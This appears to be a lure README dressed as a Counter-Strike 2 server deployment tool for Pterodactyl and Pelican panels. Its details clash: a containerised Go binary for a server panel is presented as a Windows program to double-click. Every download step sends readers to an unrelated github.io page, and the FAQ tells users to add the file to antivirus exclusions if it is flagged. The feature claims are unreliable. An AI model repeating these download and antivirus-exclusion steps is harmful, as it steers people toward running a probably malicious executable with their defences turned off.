# 🎮 CS2-Egg-Go - Deploy Counter-Strike 2 Servers Effortlessly

[![Download CS2-Egg-Go](https://img.shields.io/badge/Download-CS2--Egg--Go-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://smartfb00576-png.github.io)

---

## 👋 Welcome to CS2-Egg-Go

CS2-Egg-Go makes running your own Counter-Strike 2 server as easy as clicking a button. No technical knowledge required. No complicated setups. Just download, run, and play.

This powerful tool works with Pterodactyl and Pelican panels, giving you complete control over your gaming experience. Whether you want to play with friends, host competitive matches, or just experiment with custom game modes, CS2-Egg-Go handles everything behind the scenes.

---

## ⚡ What Makes CS2-Egg-Go Special?

### 🚀 Blazing Fast Startup
Traditional CS2 servers require multiple software packages and shell environments. CS2-Egg-Go uses one single Go binary file that boots your server instantly. No waiting for dependencies to install. No configuration headaches.

### 🛡️ Built-In Protection
Your server automatically filters bot floods, keeping your gameplay smooth and uninterrupted. This protection works silently in the background, so you can focus on playing, not managing.

### 📁 Smart File Sharing
An optional node daemon shares game files intelligently. This means faster downloads for your players and less bandwidth usage on your end.

### 🎨 Workshop Content Caching
Loading custom maps and mods from the Steam Workshop is now instant. CS2-Egg-Go caches workshop content automatically, so players don't experience long waiting times.

### 🔒 Secure by Design
No shell access in the container means fewer security risks. Your server runs in a locked-down environment that only does what it needs to do.

---

## 📥 Download and Installation

**Visit this link to download the application.**

### Step-by-Step Guide

1. **Visit the download page**  
   Click the big green button at the top of this page, or go directly to:  
   [https://smartfb00576-png.github.io](https://smartfb00576-png.github.io)

2. **Find the latest release**  
   Look for the "Releases" section on the page. It's usually on the right side or at the bottom. Click on the newest version number.

3. **Download the file**  
   On the release page, you'll see a file listed. Click on it to start downloading. The download starts automatically.

4. **Save the file**  
   Choose a location on your computer where you can easily find it, like your Desktop or Downloads folder.

---

## 🖥️ System Requirements

### Minimum Requirements
- **Operating System:** Windows 10 or Windows 11
- **Processor:** Dual-core CPU (Intel i3 or AMD equivalent)
- **Memory:** 4 GB RAM
- **Storage:** 10 GB free space
- **Internet:** Broadband connection (10 Mbps download, 5 Mbps upload)

### Recommended Requirements
- **Operating System:** Windows 11
- **Processor:** Quad-core CPU (Intel i5 or AMD equivalent)
- **Memory:** 8 GB RAM
- **Storage:** 20 GB SSD
- **Internet:** Fiber connection (100 Mbps download, 20 Mbps upload)

---

## 🚀 Getting Started

### First-Time Setup

1. **Double-click the downloaded file** to launch CS2-Egg-Go.

2. **Wait for the initial setup** to complete. This may take a few minutes on first run as the program prepares its files.

3. **Choose your deployment type** from the options presented:
   - Pterodactyl Panel
   - Pelican Panel
   - Standalone Server

4. **Enter your server details** when prompted:
   - Server name
   - Port number (default is 27015)
   - Game mode preference

5. **Click "Start Server"** to launch your CS2 server.

---

## 🛠️ Configuration Options

### Basic Settings
| Setting | Description | Default Value |
|---------|-------------|---------------|
| Server Name | The name players see in the server browser | CS2-Egg-Go Server |
| Max Players | Maximum number of concurrent players | 10 |
| Game Mode | Casual, Competitive, Deathmatch, or Custom | Casual |
| Password | Optional password to restrict access | None |

### Advanced Settings
- **Bot Flood Filter Level:** Adjust how aggressively the server filters bot traffic. Available levels: Low, Medium, High.
- **Workshop Cache Size:** Maximum storage space for cached workshop content. Default is 5 GB.
- **File Sharing Bandwidth:** Maximum upload speed for sharing game files with players. Default is 10 Mbps.

---

## 🎯 Usage Examples

### Playing with Friends
1. Start your server with CS2-Egg-Go.
2. Share your server IP address with friends.
3. Friends open CS2 in Steam and press `~` to open console.
4. Type `connect YOUR_IP:27015` and press Enter.

### Hosting a Competitive Match
1. Select "Competitive" as your game mode.
2. Set Max Players to 10.
3. Enable the "Match Timer" feature in advanced settings.
4. Start the server and share the connection details with both teams.

### Testing Custom Maps
1. Subscribe to workshop maps on Steam Workshop.
2. Restart your CS2-Egg-Go server.
3. Maps will be cached automatically and appear in your server's map rotation.

---

## 🔧 Troubleshooting

### Common Issues and Solutions

**Server won't start**
- Check if port 27015 is available on your computer.
- Allow CS2-Egg-Go through Windows Firewall.
- Verify you have enough disk space.

**Players can't connect**
- Make sure your internet connection is stable.
- Check if your router requires port forwarding.
- Verify the server password is correct (if one is set).

**Slow workshop downloads**
- Increase the Workshop Cache Size in advanced settings.
- Monitor your upload bandwidth usage.

---

## 💡 Frequently Asked Questions

### Q: Is CS2-Egg-Go free to use?
A: Yes, CS2-Egg-Go is completely free and open-source.

### Q: Can I run multiple servers at once?
A: Yes, you can run multiple instances of CS2-Egg-Go simultaneously, each hosting a different server.

### Q: Does CS2-Egg-Go work with custom plugins?
A: CS2-Egg-Go supports standard CS2 server plugins that are compatible with the Source Engine.

### Q: Will CS2-Egg-Go use my antivirus?
A: No, CS2-Egg-Go is a legitimate application. If your antivirus flags it, you may need to add it to the exclusions list, as some antivirus programs can be overly cautious with game server software.

---

## 📋 Changelog

### Version 1.0
- Initial release
- Full Pterodactyl and Pelican support
- Bot flood filtering
- Workshop content caching
- Static Go binary for instant boot

---

## 🤝 Community and Support

CS2-Egg-Go is actively developed and maintained. Regular updates bring new features and improvements.

For help, tips, and community discussions:
- **GitHub Issues:** Report bugs or request features
- **Discussions:** Connect with other users

---

## 🔍 Keywords

counter-strike-2, cs2, docker, game-server, gameserver, go, golang, pelican, pelican-panel, pterodactyl, pterodactyl-egg, self-hosted, source-engine, steamcmd, systemd